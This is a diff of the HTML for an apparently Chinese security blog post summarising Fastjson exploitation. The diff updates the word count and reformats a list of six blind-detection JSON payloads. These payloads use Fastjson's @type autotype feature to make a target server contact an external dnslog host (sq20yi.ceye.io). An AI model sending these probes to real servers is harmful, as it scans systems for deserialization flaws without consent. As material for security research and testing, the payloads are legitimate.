@@ -33,7 +33,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/songzhiv.github.io\/fastjson\/"
-        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  7566 ,
+        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  7578 ,
         "url": "https:\/\/songzhiv.github.io\/fastjson\/","datePublished": "2022-02-01T23:11:59+08:00","dateModified": "2022-02-18T21:11:59+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "nmk","logo": "https:\/\/songzhiv.github.io\/images\/avatar.png"},"author": {
@@ -110,7 +110,7 @@
             <div class="toc-content always-active" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">Fastjson利用总结</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>nmk</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-01">2022-02-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 7566 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-01">2022-02-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 7578 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 16 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -186,15 +186,25 @@
         alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162127-cb8po6i.png"
         title="image.png" /></p>
 <p><strong>无回显使用dnslog探测POC：</strong></p>
-<ol>
-<li><code>{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;}}</code></li>
-<li><code>{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;}</code></li>
-<li><code>{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;sq20yi.ceye.io&quot;}</code></li>
-<li><code>{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}}&quot;&quot;}</code></li>
-<li><code>Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}</code></li>
-<li><code>{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://sq20yi.ceye.io&quot;}:0</code></li>
-</ol>
-<p>抓包修改请求体</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">1. {&#34;@type&#34;:&#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:,&#34;val&#34;:&#34;sq20yi.ceye.io&#34;}}
+2. {&#34;@type&#34;:&#34;java.net.Inet4Address&#34;,&#34;val&#34;:&#34;sq20yi.ceye.io&#34;}
+3. {&#34;@type&#34;:&#34;java.net.Inet6Address&#34;,&#34;val&#34;:&#34;sq20yi.ceye.io&#34;}
+4. {&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONObject&#34;, {&#34;@type&#34;: &#34;java.net.URL&#34;, &#34;val&#34;:&#34;http://sq20yi.ceye.io&#34;}}&#34;&#34;}
+5. Set[{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://sq20yi.ceye.io&#34;}
+6. {{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://sq20yi.ceye.io&#34;}:0
+</code></pre></td></tr></table>
+</div>
+</div><p>抓包修改请求体</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
